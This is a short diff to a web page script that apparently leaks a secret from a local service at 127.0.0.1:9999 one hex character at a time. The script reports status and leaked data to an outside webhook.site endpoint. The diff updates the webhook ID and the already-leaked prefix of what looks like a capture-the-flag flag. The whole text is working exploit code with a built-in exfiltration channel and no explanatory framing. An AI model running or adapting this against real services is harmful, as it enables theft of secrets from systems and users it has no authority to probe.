@@ -6,7 +6,7 @@
 <pre id="output"></pre>
 <script>
 const TARGET = 'https://127.0.0.1:9999/';
-const WEBHOOK = 'https://webhook.site/b63baddd-e909-4127-81ca-f44ebc0e04b9/';
+const WEBHOOK = 'https://webhook.site/a408d71b-0cc8-4104-a331-ccd4889d5836/';
 const CHARSET = '0123456789abcdef';
 
 function log(msg) {
@@ -83,8 +83,8 @@ async function start() {
     fetch(WEBHOOK + '?status=continue_started').catch(e=>{});
     
     // START FROM KNOWN PREFIX
-    let known = 'lebah2e2044eb482';
-    const charsGot = 11; // Already have 6 hex chars
+    let known = 'lebah2e2044';
+    const charsGot = 6; // Already have 6 hex chars
     const charsNeeded = 12 - charsGot; // Need 6 more
     
     log(`Already leaked: ${charsGot}/12 chars`);
